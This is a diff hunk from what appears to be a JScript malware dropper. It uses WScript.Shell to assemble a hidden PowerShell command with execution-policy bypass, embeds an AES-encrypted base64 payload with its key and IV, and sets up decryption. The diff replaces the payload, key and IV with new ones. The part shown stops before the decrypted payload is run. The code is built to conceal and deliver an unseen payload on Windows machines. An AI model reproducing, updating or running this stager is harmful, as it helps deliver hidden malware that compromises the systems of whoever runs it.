@@ -11,10 +11,12 @@
                 var shell = new ActiveXObject("WScript.Shell");
 
                 var psCommand = "powershell -nop -w hidden -ep bypass -Command \"";
-                psCommand += "$encBytes = [Convert]::FromBase64String('XHf7oiIQw9M7oLQT67NdlQZIiTV/MtshbF/PqfiIaC/a0QTI7MVbTjDwo3GWly6M');";
+                psCommand += "$encBytes = [Convert]::FromBase64String('+Of1hrzCZqV0c9+QIrGS5LgmhwZXMV7BGfnX/cGfbYLu4WSuGhI991YLenycnqhw683TtBMAkH9P8uUGBL1ZoJW9HbHur
+Xjotpw6+ryZf0sdRZlaEZXTsfok08tElgA6g94AqgTl5fKxERfP6vr8URhROf9PPsBec3g5llH5PvnyPGaubhLYKWiI1TLccXrWwCO+Smqldv/QalDUwNK
+4Kg==');";
                 psCommand += "$aes = [System.Security.Cryptography.Aes]::Create();";
-                psCommand += "$aes.Key = $([Convert]::FromBase64String('eO0xjnIkl3O3J6+4kd/KItkobYNsJywGrBWF0mYnKEU='));";
-                psCommand += "$aes.IV = $([Convert]::FromBase64String('JGN2qXYzy3E1Rj96GGev/w=='));";
+                psCommand += "$aes.Key = $([Convert]::FromBase64String('0RolkdpAwd3DeA+ZmzWro4xIpZ0//MCN9ZK4imzeTDE='));";
+                psCommand += "$aes.IV = $([Convert]::FromBase64String('iXaoHvBeMPJ0VtL9+qj5TA=='));";
                 psCommand += "$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;";
                 psCommand += "$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;";
                 psCommand += "$decryptor = $aes.CreateDecryptor();";
